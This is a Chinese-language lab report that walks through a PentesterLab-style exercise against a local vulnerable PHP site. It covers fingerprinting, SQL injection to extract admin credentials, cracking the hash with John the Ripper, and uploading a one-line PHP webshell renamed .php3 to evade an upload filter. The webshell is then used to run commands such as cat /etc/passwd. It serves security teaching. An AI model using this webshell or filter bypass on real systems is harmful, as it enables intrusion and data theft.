# 实验三 从SQL注入到Shell

### 实验目的

在基于PHP的网站中使用SQL注入并使用它来访问管理页面，用这种访问，在目标服务器上获得代码执行。

### 实验步骤

攻击分为3个步骤：

* 指纹：收集有关Web应用程序和正在使用的技术的信息。
* SQL注入的检测和利用：学习SQL注入如何工作以及如何利用它们来检索信息。
* 访问管理页面和代码执行：访问操作系统和运行命令的最后一步。

### 环境配置

目标机和攻击者主机配置在统一局域网段，使攻击者主机可以访问目标机。

目标机IP：

![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E9%9D%B6%E6%9C%BAIP.png)

攻击者主机IP：

![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E6%94%BB%E5%87%BB%E8%80%85%E4%B8%BB%E6%9C%BAIP.png)

配置结果：

![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/ping%E6%95%88%E6%9E%9C.png)

### 实验过程

#### 收集指纹

   * HTTP请求，通过观察服务器发回的HTTP头来检索PHP版本和Web服务器的信息：

   ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/HTTP%E8%AF%B7%E6%B1%82%E6%B5%8B%E8%AF%95.png)

   * 使用Burp Suite作为代理检索相同的信息：

   ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/BurpSuite%E5%8A%AB%E6%8C%81.png)

   * HTTPS请求失败，说明应用程序只能通过HTTP（没有任何运行在端口443上）：

   ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/HTTPS%E8%AF%B7%E6%B1%82%E5%A4%B1%E8%B4%A5.png)

   * 工具wfuzz使用蛮力检测Web服务器上的目录和页面：

     1）使用命令：<br/>
     `$ python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://vulnerable/FUZZ`

     其中：<br/>
     `-c 表示高亮显示`<br/>
     `-z file，wordlist / general / big.txt  告诉wfuzz使用文件wordlists / general / big.txt作为字典来强制远程目录的名字。`<br/>
     ` --hc 404  告诉wfuzz忽略响应，如果响应代码是404（Page not found）`<br/>
     `http：// vulnerable / FUZZ  告诉wfuzz用字典中的每个值替换URL中的FUZZ这个词。`<br/>

     ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E6%A3%80%E6%B5%8B%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95.png)

     2）检测远程目录下的PHP脚本

     ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E6%A3%80%E6%B5%8B%E8%BF%9C%E7%A8%8B%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84PHP%E8%84%9A%E6%9C%AC.png)

#### SQL注入的检测和利用

   * 因为单引号，数据库会引发错误。由于显示了错误消息，因此很容易检测到网站中的任何漏洞。这里提示语法错误，显示数据库为Mysql

   ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E5%8F%91%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BAMySQL.png)

   * 基于数字的检索

      *用户提供的值被视为一个整数直接回显到SQL请求中*

       1）效果1

       ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E5%9F%BA%E4%BA%8E%E6%95%B0%E5%AD%97%E7%9A%84%E6%A3%80%E7%B4%A21.png)

       2）效果2

       ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E5%9F%BA%E4%BA%8E%E6%95%B0%E5%AD%97%E7%9A%84%E6%A3%80%E7%B4%A22.png)

   * 利用UNION开发SQL注入

     * 获得数据库版本号

     ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC%E5%8F%B7.png)

     * 获得系统当前用户名：

     ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E8%8E%B7%E5%BE%97%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%90%8D.png)

     * 当前数据库名：

     ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png)

     * 使用ORDER BY语句（告诉数据库应该使用哪个列对结果进行排序）猜测列的数量，语句中的列号大于查询中的列数4，抛出错误

     ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/Order%20by%E6%B5%8B%E8%AF%95.png)

   * MySQL提供的表格包含有关自MySQL 5以来可用的数据库，表格和列的元信息。使用这些表来检索我们需要建立最终请求的信息。这些表存储在数据库information_schema中。

      * 检索数据库中的所有表名

      ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D.png)

      * 检索数据库中的所有列名

      ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D.png)

      * 检索数据库中表名列名的对应关系

      ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E8%A1%A8%E5%90%8D%E5%88%97%E5%90%8D%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB.png)

   * 使用关键字CONCAT注入的同一部分中连接表名和列名，构建一个查询来从这个表中检索信息，获取用于访问管理页面的用户名和密码：

   ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.png)

   * 访问管理页面和代码执行

     * 使用工具John-The-Ripper破解密码

      * 进入字典所在文件路径，并查看路径下的文件

      ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E8%BF%9B%E5%85%A5%E5%AD%97%E5%85%B8%E6%89%80%E5%9C%A8%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84.png)

      * 解压缩字典文件，查看详细信息并显示头

      ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%AD%97%E5%85%B8%E6%96%87%E4%BB%B6.png)

      * 创建password文件，包含待解密密码。为John提供正确格式的信息：把用户名和密码放在冒号“：”分隔的同一行。

        `admin:8efe310f9ab3efeae8d410a8e0166eb2`

      ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81.png)

      命令含义<br/>
      `password.txt告诉john什么文件包含密码哈希`<br/>
      `--format = raw-md5告诉john密码哈希是raw-md5格式`<br/>
      `--wordlist = xxxx 告诉john使用路径xxxx下的文件作为一个词典`<br/>
      `--rules告诉John尝试提供每个单词的变体`

      密码破解成功为:P4ssw0rd

#### 上传Webshell脚本

  * 根据破解的密码和SQL注入查询到的用户名进入管理界面

  ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E8%BF%9B%E5%85%A5%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2.png)

  * 登录成功

  ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.png)

  * 发现文件上传功能

  ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E5%8F%91%E7%8E%B0%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%8A%9F%E8%83%BD.png)

  * 创建PHP脚本,  该脚本获取参数cmd的内容并执行它
    ```Php
    <?php
    system($_GET['cmd']);
    ?>
    ```

  * 上传失败后（提示禁止上传php）更改后缀名，上传成功

  *(该应用程序阻止文件扩展名为.php上传,使用php3为后缀名绕过.php的过滤)*

  ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E4%B8%8A%E4%BC%A0php%E6%96%87%E4%BB%B6.png)

  * 找到PHP脚本的位置，要确保该文件可以直接用于Web客户端。可以访问新上传图片的网页，查看<img标签指向的位置：

  ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E6%9F%A5%E7%9C%8B%E4%B8%8A%E4%BC%A0%E7%9A%84php%E6%96%87%E4%BB%B6.png)

### 实验结果

   代码执行（访问以下地址的页面，并使用cmd参数开始运行命令）：
   * 访问http：//vulnerable/admin/uploads/shell.php3？cmd = uname将在操作系统上运行命令uname并返回当前内核。

   ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%86%85%E6%A0%B8.png)

   * ls获取当前目录的内容

   ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E7%9A%84%E5%86%85%E5%AE%B9.png)

   * cat / etc / passwd获取系统用户的完整列表

   ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8.png)

   * 无法获取文件/ etc / shadow的内容，因为web服务器无法访问此文件

     *（webshell与运行PHP脚本的web服务器具有相同的权限）*

  ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E6%97%A0%E6%B3%95%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6shadow%E7%9A%84%E5%86%85%E5%AE%B9.png)

   * 运行ls / etc获取目录/ etc /的内容

   *（每个命令独立于以前的命令运行在一个全新的上下文中，无法通过运行cd / etc和ls来获取/ etc /目录的内容，因为第二个命令将处于新的上下文中。）*

   ![](https://raw.githubusercontent.com/15xinanwzy/ns/master/2017-2/wyq_wzy_lw/wzy_HW/HW_3/Images/%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95etc%E7%9A%84%E5%86%85%E5%AE%B9.png)
